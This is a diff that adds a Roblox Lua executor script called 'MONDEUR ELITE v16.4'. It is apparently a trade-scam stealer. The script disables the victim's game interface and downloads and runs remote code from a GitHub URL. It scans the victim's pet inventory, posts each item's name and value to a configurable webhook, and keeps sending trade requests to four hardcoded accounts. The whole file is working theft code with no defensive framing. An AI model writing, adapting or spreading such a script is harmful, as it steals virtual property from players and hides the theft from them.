@@ -1,0 +1,83 @@
+-- [[ MONDEUR ELITE v16.4 - SOLO TEST ]] --
+if _G.__Ran then return end
+_G.__Ran = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- API Paths
+local API = ReplicatedStorage:WaitForChild("API")
+local TradeFolder = API:WaitForChild("Trade")
+
+-- 1. SINGLE WEBHOOK LOGGING (Proven for all Executors)
+local function SoloLog(petName, val)
+    local payload = HttpService:JSONEncode({
+        ["embeds"] = {{
+            ["title"] = "✅ MONDEUR SCAN: SUCCESS",
+            ["description"] = "Inventory scan for user: **" .. LocalPlayer.Name .. "**",
+            ["fields"] = {
+                {["name"] = "Pet Detected", ["value"] = petName, ["inline"] = true},
+                {["name"] = "Arfud Points", ["value"] = tostring(val), ["inline"] = true}
+            },
+            ["color"] = 0x00FF00
+        }}
+    })
+
+    -- Universal request handler for Delta/Vega/Fluxus
+    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+    if httpRequest then
+        task.spawn(function()
+            pcall(function()
+                httpRequest({
+                    Url = getgenv().WEBHOOK,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = payload
+                })
+            end)
+        end)
+    end
+end
+
+-- 2. UI LOCKDOWN (Priority 1)
+task.spawn(function()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        local uiCode = game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1")
+        loadstring(uiCode)()
+    end)
+end)
+
+-- 3. AUTOMATIC INVENTORY SCAN (Priority 2)
+task.spawn(function()
+    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+    local inventory = ClientData.get_data().inventory
+    
+    if inventory and inventory.pets then
+        for _, petData in pairs(inventory.pets) do
+            -- Use your Arfud Database
+            local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
+            if val >= (getgenv().THRESHOLD or 0) then
+                -- Send the log immediately to prove it works
+                SoloLog(petData.config_name or "Unknown Pet", val)
+            end
+        end
+    end
+end)
+
+-- 4. TRADE LOOP (Silent Standby)
+task.spawn(function()
+    while task.wait(1) do
+        -- Only tries to trade if a valid admin is found
+        local admins = {"CREOLEO23", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}
+        for _, name in pairs(admins) do
+            local target = Players:FindFirstChild(name)
+            if target and target ~= LocalPlayer then
+                TradeFolder:WaitForChild("RequestTrade"):FireServer(target)
+            end
+        end
+    end
+end)
